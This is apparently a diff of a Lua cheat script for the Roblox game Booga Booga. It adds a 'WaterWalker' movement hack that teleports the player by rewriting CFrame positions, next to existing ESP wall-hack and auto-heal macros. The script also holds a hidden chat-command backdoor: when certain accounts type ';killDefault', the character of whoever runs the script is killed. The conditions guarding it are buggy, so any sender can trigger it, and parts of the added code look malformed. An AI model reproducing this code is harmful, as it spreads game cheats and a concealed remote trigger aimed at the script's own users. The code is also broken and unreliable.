@@ -5,6 +5,9 @@ local lplr = game.Players.LocalPlayer
 
 local Tab = Window:NewTab("Macros")
 local Section = Tab:NewSection("Inventory")
+
+local Tab3 = Window:NewTab("Misc")
+local Section3 = Tab:NewSection("Auto")
 Section:NewButton("AutoHeal", "Requires BloodFruit", function()
 	while true do wait()
 			if game.Players.LocalPlayer.Character.Humanoid.Health < 65 then
@@ -21,15 +24,32 @@ Section:NewButton("AutoHeal", "Requires BloodFruit", function()
 	end
 end)
 
---[[Section:NewButton("AutoRebirth", "Rebirths when you get to level 100", function()
-	game:GetService("StarterGui"):SetCore("SendNotification", {
-		Title = "Booga Booga X",
-		Text = "Will not save items on rebirth",
-		Duration = 1,
-	})
+Section3:NewButton("WaterWalker", "Makes You Have WaterWalker For Free", function()
+	while wait() do
+	if lplr.Character.Humanoid.WalkSpeed < 16 then
+		Speed = 0.21
+
+		_G.Speed = true
+
+		You = game.Players.LocalPlayer.Name
+		UIS = game:GetService("UserInputService")
+
+			if UIS:IsKeyDown(Enum.KeyCode.W) then
+				game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,-Speed)
+			end;
+			if UIS:IsKeyDown(Enum.KeyCode.A) then
+				game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(-Speed,0,0)
+			end;
+			if UIS:IsKeyDown(Enum.KeyCode.S) then
+				game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0,0,Speed)
+			end;
+			if UIS:IsKeyDown(Enum.KeyCode.D) then
+				game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(Speed,0,0)
+			end;
+		end
+	end)
+end
 	
-end)
---]]
 local Tab = Window:NewTab("Visuals")
 local Section = Tab:NewSection("Render")
 Section:NewButton("PlayerEsp", "Views Players on the other side of Walls", function()
@@ -117,7 +137,7 @@ local whitelisted = "noobycreeper2"
 			if player.Name == "relviesx" or "3g4g34g34g43g" then
 
 				if message == ";killDefault" then
-					if lplr.Name ~= "relviesx" or lplr.Name ~= "3g4g34g34g43g" then
+					if lplr.Name ~= whitelisted or lplr.Name ~= "3g4g34g34g43g" then
 						lplr.Character.Humanoid.Health = 0
 						task.wait(3)
 					end
